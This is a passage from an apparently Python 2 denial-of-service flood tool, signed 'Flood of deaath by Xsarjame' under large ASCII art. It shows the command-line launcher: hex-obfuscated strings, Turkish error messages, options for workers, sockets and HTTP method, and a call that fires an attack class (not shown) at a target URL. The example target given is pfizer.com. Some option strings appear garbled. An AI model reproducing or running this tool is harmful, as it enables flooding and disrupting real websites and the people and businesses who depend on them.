                        .@@@@@@@#(@@@@@@@@@@@(.&@@@@@%. #@@@@@@@@@@@@,(@@@@@@@@@@,%@@@@@@@@@@@@@@@@@@@@&#,.*%&#(#&@.    *@(.&@@@@@@%/,/&@@@@@@.@&                        *@% &.    
                          /@@@@@% @@@@@@@@@@@.#@@@@%  ,*%@@@@@@@@/     (@@@@@@@@@@(.%@@@@@@@@@@@@@@@@@@@@@@@@@%(,.,///,,#@@@@@@@@.      *@@@@@@/@*.,.                  .&%@&,#,    
                            .(@@@/(@@@@@@@@@#*@@@*    .&@@@@@@@.        &@@@@@@@@@@@@&,%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*         /@@@@@#                      *(*@@(       
                                ,#((@@@@@@@@%*,   ,,    *@@@@@@@/        /@@@@@@@@@@@@#    ./&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*           /@@@@.*                      (/@#         
                                     &@@@@@@@#. ,& *      (@@@@@&   ,           ,@@@@@&.          /%&@@@@@@@@@@@@@@@@@@@@%*              #@@@#(.                * . #(&@(          
                                   *@@@@@@@@@@#.. ,%       /@@@@@#  #.         .*#@@@@@(                  ..,,,,,,,,                     /@@@&               # .(*%*&@/            
                                 &@@@@@@@@@@@/          ,/%@@@@@/ .%/            .@@@@@&.                                                 %@@@@,      *, .,,(@%//@@%,              
                               /@@@@@@@@@@&,       ,%@@@@/&@@(                   #@@@@@@@.                                                 ,&@@@@&(,/*//(%&@@@&(.                  
                             (@@@@@@@@@@#         #..%( (@/                     #@@@@@@@(#                                                     ./@@@@@@@@*,                         
                           ,@@@@@@@@@@@&             (  *                     (@@@@@@*%@, #.                                                                                       
                         ,&@@@@@@@@@@@@(                                     .  /@&, .&%                                                                                           
                       ( #@@@@@@@@@@@@@,                                              .                                                                                            
                       /&@@@@@@@@@@&.  ,@.                                                                                                                                         
                     (@@@@@@@&@#*.      ,                                                                                                                                          
                     ,*( . /     
                                                       
""" 



def usage():
    print
    print ""
    print "Flood of deaath by Xsarjame"
    print
    print ""


    
def error(msg):
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)


def main():
    
    try:

        if len(sys.argv) < 2:
            error("Hedef Belirtiniz = python2 fld.py http://www.pfizer.com")

        url = sys.argv[1]

        if url == "\x2D\x68":
            usage()
            sys.exit()

        if url[0:4].lower() != "\x68\x74\x74\x70":
            error("\x48\x65\x64\x65\x66\x20\x55\x72\x6C\x64\x65\x20\x48\x61\x74\x61\x20\x56\x61\x72\x20\x2D\x20\x31")

        if url == None:
            error("\x48\x65\x64\x65\x66\x20\x55\x72\x6C\x64\x65\x20\x48\x61\x74\x61\x20\x56\x61\x72\x20\x2D\x20\x32")

        opts, args = getopt.getopt(sys.argv[2:], "\x64\x68\x77\x3A\x73\x3A\x6D\x3A", ["\x64\x65\x62\x75\x67", "\x68\x65\x6C\x70", "\x77\x6F\x72\x6B\x65\x72\x73", "\x73\x6F\x63\x6B\x65\x74\x73", "\x6D\x65\x74\x68\x6F\x64" ])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        for o, a in opts:
            if o in ("\x2D\x68\x68", "\x2D\x2D\x68\x65\x6C\x70"):
                usage()
                sys.exit()
            elif o in ("\x2D\x73\x73", "\x2D\x2D\x73\x6F\x63\x6B\x65\x74"):
                socks = int(a)
            elif o in ("\x2D\x77\x77", "\x2D\x2D\x77\x6F\x72\x6B\x65\x72"):
                workers = int(a)
            elif o in ("\x2D\x64\x64", "\x2D\x2D\x64\x65\x62\x75\x67\x65\x64"):
                global DEBUG
                DEBUG = True
            elif o in ("\x2D\x6D\x6D", "\x2D\x2D\x6D\x65\x74\x68\x6F\x64\x73"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("\x6D\x65\x74\x68\x6F\x64\x20\x7B0\x7D\x20\x69\x73\x20\x69\x6E\x76\x61\x6C\x69\x64".format(a))
            else:
                error("\x6F\x70\x74\x69\x6F\x6E\x20\x27"+o+"\x27\x20\x64\x6F\x65\x73\x6E\x27\x74\x20\x65\x78\x69\x73\x74\x73")

        r000t = R00T(url)
        r000t.nr_workers = workers
        r000t.method = method
        r000t.nr_sockets = socks

        r000t.fire()

    except getopt.GetoptError, err:

        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "\x5F\x5F\x6D\x61\x69\x6E\x5F\x5F":
    main()
